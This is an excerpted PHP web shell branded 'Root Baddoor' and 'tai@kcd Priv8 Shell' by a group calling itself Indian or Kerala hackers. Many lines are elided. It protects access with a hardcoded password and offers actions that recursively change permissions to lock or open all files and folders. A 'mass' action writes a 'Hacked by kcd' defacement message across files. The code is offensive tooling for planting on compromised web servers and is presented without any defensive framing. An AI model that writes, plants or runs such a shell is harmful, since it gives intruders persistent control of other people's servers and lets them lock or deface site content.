...
error_reporting(0);
	...
	$correctPassword = "jordanxkcd"; //Change Password
	...
	<html>
	<head>
	<title>Root Baddoor</title>
	<link rel='icon' href='https://i.postimg.cc/YCcbh6yY/6062074634834133453-photoaidcom-cropped.png'>
...
tb5_messages[0] = "TAI CORE - KCD CORE";
tb5_messages[1] = "Made By kcd";
tb5_messages[2] = "We Are Indian Hackers";
tb5_messages[3] = "kcd hackers";
tb5_messages[4] = "Follow us";
tb5_messages[5] = "Made By kcd";
...
tb5_randomizetitle();
	...
	<body>
	<form method="post">
		<p><font color='red'>Start Attack!</font></p>
...
<center>
	<br><br><br><br>
<h1 class="t3x">  <font color="#FF671F" size="6">KERALA</font> <font color="#FFFFFF" size="6">CYBER</font> <font color="#046A38" size="6">DEFENDERS</font>  </h1>
<font face="Bungee" size="5">tai@kcd Priv8 Shell</font></center>
...
function author() {
	echo "<center><br>kcd-core</center>";
	exit();
}
...
$currentDirectory = '.';
    ...
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Success Green All Files</p>";
    echo "</center>";
}
...
if (isset($_GET['do']) && $_GET['do'] === 'dark_file') {
    ...
    changeFilePermissionsRecursive($currentDirectory, $newFilePermissions);
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Success Lock All Files</p>";
    echo "</center>";
}
...
if (isset($_GET['do']) && $_GET['do'] === 'dark_folders') {
    ...
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Success Lock All Folders</p>";
    echo "</center>";
}
...
if (isset($_GET['do']) && $_GET['do'] === 'root_folders') {
    ...
    changeFolderPermissionsRecursive($currentDirectory, $newFolderPermissions);
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Success Green All Folders</p>";
    echo "</center>";
}
	...
	elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by kcd</textarea><br>
